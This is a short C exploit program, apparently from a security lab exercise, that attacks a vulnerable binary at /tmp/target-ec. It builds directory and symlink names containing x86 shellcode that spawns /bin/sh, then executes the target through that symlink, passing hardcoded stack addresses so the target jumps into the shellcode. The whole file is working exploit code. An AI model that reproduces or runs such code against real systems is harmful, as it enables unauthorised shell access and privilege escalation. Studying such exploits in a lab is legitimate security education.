#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include <errno.h>
#include <sys/stat.h> 

#define TARGET "/tmp/target-ec"
#define SIZE 100
int main(void)
{
  char *args[4];
  char *env[1];
  
  /*
   * Shellcode itself contains /, so we need to create __/  
   * and ___/bin/ before creating the desired file, thus -p
   * creates a directory whose path is the shellcode 
   */
  static char mkdir_cmd[] =
    "mkdir -p \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

  /* 
   * creates a symlink from 'link' file inside directory to /tmp/target-ec 
   * Do we want to use -f here? Just for the sake of removing already existing warning.
   */
  static char ln_cmd[] =
    "ln -s /tmp/target-ec \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh/link";


  static char symlinkname[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh/link";

  
  int a = system (mkdir_cmd);
  int b = system (ln_cmd);
  printf("%d %d\n", a, b);
  
  args[0] = TARGET;
  args[1] = "0xbffffe7c"; 
  args[2] = "0xbfffffc9";
  args[3] = NULL;
  env[0] = NULL;

 if (0 > execve(symlinkname, args, env))
    fprintf(stderr, "execve failed.\n");
  return 0;
}
